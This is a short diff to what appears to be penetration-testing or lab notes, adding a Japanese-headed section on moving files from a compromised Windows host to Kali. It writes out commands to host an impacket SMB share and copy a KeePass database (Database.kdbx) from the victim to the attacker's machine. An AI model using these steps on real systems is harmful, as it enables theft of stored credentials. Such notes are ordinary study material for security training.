@@ -594,3 +594,16 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\wario\Documents> 
 ```
+### Windows サーバから Kali への file アップロード
+```
+On kali in /tmp folder to avoid write errors:
+
+kali@kali:~$ impacket-smbserver -smb2support newShare . -username test -password test
+
+Then as Jim:
+
+PS C:\Users\jim\Documents> net use z: \\192.168.XX.X\newShare /u:test test
+PS C:\Users\jim\Documents> copy Database.kdbx z:\
+
+Then you should get on kali to enumerate further 
+```
